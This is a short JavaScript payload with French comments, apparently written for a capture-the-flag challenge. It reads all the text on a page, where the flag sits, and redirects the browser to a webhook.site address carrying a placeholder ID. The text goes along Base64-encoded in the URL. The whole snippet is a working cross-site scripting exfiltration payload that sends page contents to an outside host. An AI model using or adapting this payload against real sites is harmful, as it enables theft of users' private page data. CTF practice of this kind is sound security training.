// On récupère tout le texte de la page (où se trouve le flag)
var flag = document.body.innerText;

// On force le navigateur à naviguer vers ton Webhook avec le flag en paramètre
// btoa() sert à encoder en Base64 pour éviter que les caractères spéciaux ne cassent l'URL
window.location.href = "https://webhook.site/TON_ID_WEBHOOK?data=" + btoa(flag);
